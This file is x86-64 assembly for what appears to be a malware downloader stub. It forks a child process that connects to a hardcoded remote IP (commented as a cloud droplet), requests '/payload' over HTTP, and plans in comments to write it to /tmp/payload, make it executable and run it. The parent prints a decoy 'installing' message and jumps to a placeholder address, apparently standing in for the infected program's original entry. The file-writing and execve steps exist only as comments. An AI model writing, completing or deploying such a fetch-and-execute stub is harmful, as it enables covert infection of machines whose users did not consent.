[bits 64]

global _start

_start: 
    mov rax, 57 ; fork
    syscall

    test rax, rax
    jnz original

    mov rax, 41 ; sys_socket
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov rbx, rax ; save socketfd

    mov rdi, rbx ; socketfd
    mov rax, 42 ; sys_connect
    sub rsp, 16
    mov word [rsp], 2
    mov word [rsp+2], 0x2823 ; port 9000 
    mov dword [rsp+4], 0xB7_D0_D1_86 ; digital ocean droplet ip
    mov rsi, rsp
    mov rdx, 16
    syscall

    ; above is opening a socket and connecting to it
    ; read bind_shell.asm to understand better it

    ; write(socketfd, request, length)   
    mov rax, 1 
    mov rdi, rbx
    lea rsi, [rel request]
    mov rdx, request_end - request
    syscall

    ; read(socketfd, buffer, length)
    xor rax, rax
    mov rdi, rbx
    sub rsp, 4096 ; allocate 4096 bytes
    mov rsi, rsp
    mov rdx, 4096
    syscall ; rax = bytes_read

    ; open("/tmp/payload", O_CREAT|O_WRONLY|O_TRUNC, 0755)

    ; fchmod(filefd, 0755)
    
    ; write(socketfd, buffer, bytes_read)

    ; close(filefd)

    ; close(socketfd)

    ; execve("/tmp/payload", ["/tmp/payload", null], null)

original:
    mov rax, 1 ; sys_write
    mov rdi, 1
    lea rsi, [rel text]
    mov rdx, text_end - text
    syscall

    mov rax, 0xDEADBEEFDEADBEEF
    jmp rax

text:
    db "installing dead beef...", 0x0A
text_end:

request:
    db "GET /payload HTTP/1.0", 0x0D, 0x0A, 0x0D, 0x0A ; "GET /payload HTTP/1.0\r\n\r\n"
request_end:

path:
    db "/tmp/payload", 0

